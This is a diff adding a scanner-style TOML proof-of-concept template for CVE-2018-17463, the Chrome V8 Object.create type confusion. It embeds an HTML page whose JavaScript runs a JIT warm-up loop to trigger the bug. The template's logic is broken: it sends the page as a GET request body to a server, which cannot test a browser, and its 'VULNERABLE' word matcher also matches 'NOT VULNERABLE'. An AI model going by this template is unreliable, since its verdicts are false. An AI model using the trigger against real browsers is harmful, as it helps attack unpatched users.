@@ -1,0 +1,51 @@
+[info]
+author = "AVE"
+description = "通过构造特制 HTML 页面触发 Google Chrome V8 引擎 Object.create 类型混淆漏洞，验证目标 Chrome 版本是否低于 70.0.3538.64"
+id = "POC-AVE-2018-0500"
+name = "CVE-2018-17463 PoC"
+severity = "high"
+tags = ["cve-2018-17463"]
+vuln_id = [
+    "CVE-2018-17463",
+    "AVE-2018-0500",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/poc-cve-2018-17463.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<html>
+<body>
+<script>
+function f(o) {
+  o.x;
+  Object.create(o);
+  return o.y.a;
+}
+f({ x : 0, y : { a : 1 } });
+f({ x : 0, y : { a : 2 } });
+for (let i = 0; i < 100000; i++)
+  f({ x : 0, y : { a : 3 } });
+var result = f({ x : 0, y : { a : 3 } });
+if (result !== 3) {
+  document.write("VULNERABLE: type confusion triggered, result=" + result);
+} else {
+  document.write("NOT VULNERABLE");
+}
+</script>
+</body>
+</html>
+"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["VULNERABLE"]
